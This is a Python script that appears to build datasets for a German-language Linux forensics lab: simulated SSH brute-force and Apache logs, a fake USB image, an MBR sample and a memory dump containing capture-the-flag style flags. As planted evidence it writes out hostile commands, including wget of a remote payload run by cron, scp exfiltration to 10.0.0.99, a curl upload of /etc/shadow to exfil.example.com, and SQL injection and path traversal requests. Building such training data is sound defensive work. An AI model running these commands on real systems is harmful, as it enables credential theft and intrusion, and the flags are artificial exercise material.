#!/usr/bin/env python3
"""
Linux Forensik Lab - Dataset Generator
Erstellt alle Uebungsdateien fuer die interaktive Lernplattform.
"""

import os
import struct
import random
import hashlib
import sys

DATASETS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "forensik-lab", "datasets")
if not os.path.exists(DATASETS_DIR):
    DATASETS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "datasets")


def ensure_dir(path):
    os.makedirs(path, exist_ok=True)


def write_file(path, content, mode="wb"):
    with open(path, mode) as f:
        f.write(content)
    print(f"  [OK] {path}")


def generate_auth_log():
    lines = []
    attacker_ip = "192.168.100.42"
    secondary_ip = "10.0.0.99"
    legitimate_user = "admin"

    # Normal logins
    lines.append("Mar 14 08:12:33 server sshd[1234]: Accepted password for admin from 192.168.1.10 port 52341 ssh2")
    lines.append("Mar 14 08:12:34 server sshd[1234]: pam_unix(sshd:session): session opened for user admin by (uid=0)")
    lines.append("Mar 14 09:45:12 server sshd[2345]: Accepted password for hlang from 192.168.1.25 port 48923 ssh2")

    # Brute force from attacker
    for i in range(250):
        hour = 2 + (i * 2 // 60)
        minute = (i * 2) % 60
        sec = random.randint(0, 59)
        user = random.choice(["root", "admin", "ubuntu", "test", "user", "postgres", "mysql", "ftp"])
        lines.append(
            f"Mar 15 {hour:02d}:{minute:02d}:{sec:02d} server sshd[{3456+i}]: "
            f"Failed password for {user} from {attacker_ip} port {40000+i} ssh2"
        )

    # Brute force from secondary IP
    for i in range(120):
        hour = 3 + (i * 3 // 60)
        minute = (i * 3) % 60
        sec = random.randint(0, 59)
        user = random.choice(["root", "admin", "www", "oracle", "git"])
        lines.append(
            f"Mar 15 {hour:02d}:{minute:02d}:{sec:02d} server sshd[{4556+i}]: "
            f"Failed password for {user} from {secondary_ip} port {50000+i} ssh2"
        )

    # Successful intrusion
    lines.append(
        "Mar 15 03:47:22 server sshd[5678]: Accepted password for admin from 192.168.100.42 port 51234 ssh2"
    )
    lines.append(
        "Mar 15 03:47:23 server sshd[5678]: pam_unix(sshd:session): session opened for user admin by (uid=0)"
    )
    lines.append(
        "Mar 15 03:47:45 server sshd[5678]: Received disconnect from 192.168.100.42 port 51234:11: disconnected"
    )

    # Suspicious activity after intrusion
    lines.append("Mar 15 03:48:01 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /etc/shadow")
    lines.append("Mar 15 03:49:12 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/wget http://10.0.0.99/payload.sh -O /tmp/payload.sh")
    lines.append("Mar 15 03:50:01 server CRON[6789]: (root) CMD (/tmp/payload.sh)")

    return "\n".join(lines) + "\n"


def generate_syslog():
    lines = []
    lines.append("Mar 14 08:00:01 server rsyslogd: [origin software=\"rsyslogd\" swVersion=\"8.2102\"] start")
    lines.append("Mar 14 08:00:02 server kernel: [    0.000000] Linux version 5.15.0-generic")
    lines.append("Mar 14 08:01:15 server systemd[1]: Started OpenSSH Server")
    lines.append("Mar 14 09:30:00 server kernel: [  123.456] usb 1-1: new high-speed USB device number 3 using xhci_hcd")
    lines.append("Mar 14 09:30:01 server kernel: [  123.789] usb-storage 1-1:1.0: USB Mass Storage device detected")
    lines.append("Mar 14 09:30:02 server kernel: [  124.012] sd 2:0:0:0: [sdb] 62500000 512-byte logical blocks: (32.0 GB/29.8 GiB)")
    lines.append("Mar 14 09:30:03 server kernel: [  124.234] sd 2:0:0:0: [sdb] Write Protect is off")
    lines.append("Mar 15 03:47:22 server sshd[5678]: Accepted password for admin from 192.168.100.42")
    lines.append("Mar 15 03:50:15 server kernel: [88888.123] possible SYN flooding on port 80. Dropping request.")
    lines.append("Mar 15 03:51:00 server apache2[9999]: Server started")
    lines.append("Mar 15 04:00:00 server systemd[1]: Started Session 42 of user admin.")
    lines.append("Mar 15 12:00:00 server rsyslogd: [origin software=\"rsyslogd\" swVersion=\"8.2102\"] normal termination")
    return "\n".join(lines) + "\n"


def generate_apache_log():
    lines = []
    attacker_ip = "192.168.100.42"
    secondary_ip = "10.0.0.99"

    # Normal requests
    lines.append('192.168.1.25 - - [15/Mar/2024:08:30:01 +0100] "GET /index.html HTTP/1.1" 200 4523')
    lines.append('192.168.1.10 - - [15/Mar/2024:08:45:12 +0100] "GET /about.html HTTP/1.1" 200 2105')

    # Suspicious requests from attacker
    lines.append(f'{attacker_ip} - - [15/Mar/2024:03:47:30 +0100] "GET /admin HTTP/1.1" 403 215')
    lines.append(f'{attacker_ip} - - [15/Mar/2024:03:47:31 +0100] "GET /admin/ HTTP/1.1" 403 215')
    lines.append(f'{attacker_ip} - - [15/Mar/2024:03:47:45 +0100] "GET /etc/passwd HTTP/1.1" 404 152')
    lines.append(f'{attacker_ip} - - [15/Mar/2024:03:47:46 +0100] "GET /../../../etc/passwd HTTP/1.1" 403 152')
    lines.append(f'{attacker_ip} - - [15/Mar/2024:03:48:00 +0100] "POST /login.php HTTP/1.1" 200 512')
    lines.append(f'{attacker_ip} - - [15/Mar/2024:03:48:05 +0100] "GET /dashboard HTTP/1.1" 200 8934')
    lines.append(f'{attacker_ip} - - [15/Mar/2024:03:48:30 +0100] "GET /api/users HTTP/1.1" 200 15234')

    # Directory traversal and SQLi attempts
    lines.append(f'{secondary_ip} - - [15/Mar/2024:03:49:01 +0100] "GET /page?id=1\\' OR 1=1-- HTTP/1.1" 403 152')
    lines.append(f'{secondary_ip} - - [15/Mar/2024:03:49:02 +0100] "GET /page?id=1 UNION SELECT * FROM users-- HTTP/1.1" 403 152')
    lines.append(f'{secondary_ip} - - [15/Mar/2024:03:49:05 +0100] "GET /../../var/log/auth.log HTTP/1.1" 403 152')

    # More normal requests
    lines.append('192.168.1.25 - - [15/Mar/2024:10:15:00 +0100] "GET /contact.html HTTP/1.1" 200 1890')

    return "\n".join(lines) + "\n"


def generate_usb_image():
    """Create a small FAT32-like image with realistic forensic content."""

    # Image size: 1MB (small but realistic structure)
    IMAGE_SIZE = 1 * 1024 * 1024  # 1MB
    SECTOR_SIZE = 512
    PARTITION_START = 2048  # Standard start sector

    image = bytearray(IMAGE_SIZE)

    # MBR Boot code (first 446 bytes)
    # Standard x86 boot code signature
    image[0] = 0xFA  # CLI
    image[1] = 0x33  # XOR
    image[2] = 0xC0  # AX,AX
    image[3] = 0x8E  # MOV
    image[4] = 0xD0  # SS,AX

    # Fill some boot code
    for i in range(5, 440):
        image[i] = 0x90  # NOP

    # Disk signature at offset 440
    struct.pack_into("<I", image, 440, 0x12345678)

    # Partition table entry 1 (offset 446)
    image[446] = 0x00  # Boot indicator (not bootable)
    # CHS start
    image[447] = 0x20
    image[448] = 0x21
    image[449] = 0x00
    image[450] = 0x0C  # Partition type: FAT32 LBA
    # CHS end
    image[451] = 0xFE
    image[452] = 0xFF
    image[453] = 0xFF
    # LBA start
    struct.pack_into("<I", image, 454, PARTITION_START)
    # Number of sectors
    total_sectors = (IMAGE_SIZE // SECTOR_SIZE) - PARTITION_START
    struct.pack_into("<I", image, 458, total_sectors)

    # MBR signature
    image[510] = 0x55
    image[511] = 0xAA

    # Embed hidden flag in MBR padding area
    flag1 = b"FORENSIK{d4t4_3xf1ltr4t10n_d3t3ct3d}"
    offset_flag1 = 100
    for i, b in enumerate(flag1):
        image[offset_flag1 + i] = b

    # Now add file content in the data area (after partition start)
    data_start = PARTITION_START * SECTOR_SIZE

    files_content = {
        "documents/report_final.pdf": b"%PDF-1.4\n% Quarterly Business Report 2024\n% CONFIDENTIAL - Internal Use Only\n% Contains financial projections and strategic plans\n%%EOF\n",
        "documents/kundenliste.xlsx": b"Kunde;Email;Umsatz;Vertragsnummer\nMueller GmbH;info@mueller.de;450000;V-2024-001\nSchmidt AG;cfo@schmidt.at;890000;V-2024-002\nWeber & Söhne;admin@weber.de;230000;V-2024-003\n",
        "hidden/.secret.txt": b"INTERNE NOTIZ\n==============\nDie Datenuebertragung an den externen Server ist fuer Freitag geplant.\nVerwendung von scp mit verschluesseltem Tunnel.\nZiel: 10.0.0.99:/data/export/\n\nACHTUNG: Nur nach 22:00 Uhr durchfuehren!\n\nPasswort: f0r3ns1c_l4b\n",
        ".bash_history": b"ls -la\ncd documents/\ncp report_final.pdf /tmp/\nscp /tmp/report_final.pdf user@10.0.0.99:/data/\ntar czf /tmp/backup.tar.gz documents/\nscp /tmp/backup.tar.gz user@10.0.0.99:/data/\nrm /tmp/report_final.pdf\nrm /tmp/backup.tar.gz\nhistory -c\nshred -u kundenliste.xlsx\nwget http://10.0.0.99/tools/clean.sh\nchmod +x clean.sh\n./clean.sh\n",
        "notes.txt": b"TODO:\n- Kundenliste bereinigen\n- Bericht an extern weiterleiten\n- Spuren verwischen\n- Passwort: Admin2024!\n- Server: https://internal.corp.local/secret\n",
    }

    # Write files into the data area
    current_offset = data_start + 4096  # Skip reserved area
    for filepath, content in files_content.items():
        if current_offset + len(content) < IMAGE_SIZE:
            # Write a simple file marker
            marker = b"::FILE:" + filepath.encode() + b"::\n"
            for i, b in enumerate(marker):
                image[current_offset + i] = b
            current_offset += len(marker)
            for i, b in enumerate(content):
                image[current_offset + i] = b
            current_offset += len(content)
            image[current_offset] = 0x0A
            current_offset += 1

    return bytes(image)


def generate_mbr_sample():
    """Create a 512-byte MBR sample with valid signature and a manipulated area."""
    mbr = bytearray(512)

    # Standard x86 boot code
    mbr[0] = 0xFA  # CLI
    mbr[1] = 0x33  # XOR SI,SI
    mbr[2] = 0xC0
    mbr[3] = 0x8E  # MOV SS,AX
    mbr[4] = 0xD0
    mbr[5] = 0xBC  # MOV SP,7C00
    mbr[6] = 0x00
    mbr[7] = 0x7C

    # More boot code
    for i in range(8, 200):
        mbr[i] = random.choice([0x90, 0x89, 0xC3, 0x31, 0xDB, 0xBE])

    # Manipulated area with DEADBEEF pattern
    manipulated = b"\xDE\xAD\xBE\xEF"
    for i in range(4):
        mbr[210 + i] = manipulated[i]
        mbr[214 + i] = manipulated[i]
        mbr[218 + i] = manipulated[i]

    # Hidden flag in ASCII in the padding area
    flag = b"FORENSIK{mbr_s1gn4tur3_v4l1d}"
    for i, b in enumerate(flag):
        mbr[240 + i] = b

    # Partition table (4 entries, first one valid)
    mbr[446] = 0x80  # Bootable
    mbr[450] = 0x07  # NTFS
    struct.pack_into("<I", mbr, 454, 2048)  # LBA start
    struct.pack_into("<I", mbr, 458, 1024000)  # Sectors

    # MBR signature
    mbr[510] = 0x55
    mbr[511] = 0xAA

    return bytes(mbr)


def generate_memory_dump():
    """Create a simulated memory dump with embedded strings."""
    data = bytearray(65536)  # 64KB

    # Fill with random bytes
    for i in range(len(data)):
        data[i] = random.randint(0, 255)

    # Embed interesting strings at known offsets
    strings_to_embed = [
        (1024, b"Admin2024!\x00"),
        (2048, b"f0r3ns1c_l4b\x00"),
        (3072, b"root:x:0:0:root:/root:/bin/bash\x00"),
        (4096, b"https://internal.corp.local/secret\x00"),
        (5120, b"suspicious@darknet-market.onion\x00"),
        (6144, b"SELECT * FROM users WHERE password LIKE '%admin%'\x00"),
        (7168, b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCy9f0/...\x00"),
        (8192, b"FORENSIK{str1ngs_15_y0ur_fr13nd}\x00"),
        (9216, b"password=Sup3rS3cr3t!\x00"),
        (10240, b"curl -X POST https://exfil.example.com/upload -F file=@/etc/shadow\x00"),
        (11264, b"/tmp/.hidden_payload.sh\x00"),
        (12288, b"mysql://dbadmin:password123@10.0.0.50:3306/internal_db\x00"),
        (14336, b"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\x00"),
        (16384, b"user@host:~$ scp -r /var/log/auth.log attacker@10.0.0.99:/tmp/\x00"),
        (18432, b"-----BEGIN RSA PRIVATE KEY-----\x00"),
    ]

    for offset, content in strings_to_embed:
        for i, b in enumerate(content):
            if offset + i < len(data):
                data[offset + i] = b

    return bytes(data)


def generate_hash_dataset():
    """Create original and manipulated text files for hash comparison."""
    original = (
        "Forensik Training - Hash Integritaetspruefung\n"
        "=============================================\n"
        "Diese Datei dient zur Uebung der Hash-Verifikation.\n"
        "SHA-256 ist der primaere Standard fuer forensische Integritaetspruefung.\n"
        "Jede Aenderung, auch ein einzelnes Bit, fuehrt zu einem komplett anderen Hash.\n"
        "Das ist das sogenannte Lawinenprinzip kryptographischer Hash-Funktionen.\n"
        "In der forensischen Praxis werden Hashes vor und nach dem Imaging erstellt.\n"
        "FORENSIK{h4sh_m17ch_d3t3ct3d}\n"
    )

    manipulated = (
        "Forensik Training - Hash Integritaetspruefung\n"
        "=============================================\n"
        "Diese Datei dient zur Uebung der Hash-Verifikation.\n"
        "SHA-256 ist der primaere Standard fuer forensische Integritaetspruefung.\n"
        "Jede Aenderung, auch ein einzelnes Bit, fuehrt zu einem komplett anderen Hash.\n"
        "Das ist das sogenannte Lawinenprinzip kryptographischer Hash-Funktionen.\n"
        "In der forensischen Praxis werden Hashes vor und nach dem Imaging erstellt.\n"
        "FORENSIK{h4sh_m17ch_m4n1pul4t3d}\n"
    )

    return original.encode("utf-8"), manipulated.encode("utf-8")


def main():
    print("=" * 60)
    print("Linux Forensik Lab - Dataset Generator")
    print("=" * 60)
    print()

    ensure_dir(DATASETS_DIR)
    ensure_dir(os.path.join(DATASETS_DIR, "hashes"))

    print("[1/7] Auth Log generieren...")
    write_file(
        os.path.join(DATASETS_DIR, "auth.log"),
        generate_auth_log().encode("utf-8"),
        "wb",
    )

    print("[2/7] Syslog generieren...")
    write_file(
        os.path.join(DATASETS_DIR, "syslog"),
        generate_syslog().encode("utf-8"),
        "wb",
    )

    print("[3/7] Apache Access Log generieren...")
    write_file(
        os.path.join(DATASETS_DIR, "apache_access.log"),
        generate_apache_log().encode("utf-8"),
        "wb",
    )

    print("[4/7] USB-Image generieren (1MB)...")
    usb_data = generate_usb_image()
    write_file(os.path.join(DATASETS_DIR, "usb_case01.img"), usb_data)
    sha256 = hashlib.sha256(usb_data).hexdigest()
    write_file(
        os.path.join(DATASETS_DIR, "hashes", "usb_case01.img.sha256"),
        f"{sha256}  usb_case01.img\n".encode("utf-8"),
    )

    print("[5/7] MBR Sample generieren...")
    mbr_data = generate_mbr_sample()
    write_file(os.path.join(DATASETS_DIR, "mbr_sample.bin"), mbr_data)

    print("[6/7] Memory Dump generieren...")
    mem_data = generate_memory_dump()
    write_file(os.path.join(DATASETS_DIR, "memory_dump_sample.raw"), mem_data)

    print("[7/7] Hash-Dataset generieren...")
    original, manipulated = generate_hash_dataset()
    write_file(os.path.join(DATASETS_DIR, "original.txt"), original)
    write_file(os.path.join(DATASETS_DIR, "manipulated.txt"), manipulated)

    orig_hash = hashlib.sha256(original).hexdigest()
    manip_hash = hashlib.sha256(manipulated).hexdigest()

    write_file(
        os.path.join(DATASETS_DIR, "hashes", "original.txt.sha256"),
        f"{orig_hash}  original.txt\n".encode("utf-8"),
    )
    write_file(
        os.path.join(DATASETS_DIR, "hashes", "manipulated.txt.sha256"),
        f"{manip_hash}  manipulated.txt\n".encode("utf-8"),
    )

    print()
    print("=" * 60)
    print("Alle Datasets erfolgreich generiert!")
    print(f"Ausgabe: {DATASETS_DIR}")
    print()
    print("Dateien:")
    for f in sorted(os.listdir(DATASETS_DIR)):
        full_path = os.path.join(DATASETS_DIR, f)
        if os.path.isfile(full_path):
            size = os.path.getsize(full_path)
            print(f"  {f:30s} {size:>10,} Bytes")
    print()
    print("Hashes:")
    hash_dir = os.path.join(DATASETS_DIR, "hashes")
    for f in sorted(os.listdir(hash_dir)):
        print(f"  {f}")
    print("=" * 60)


if __name__ == "__main__":
    main()
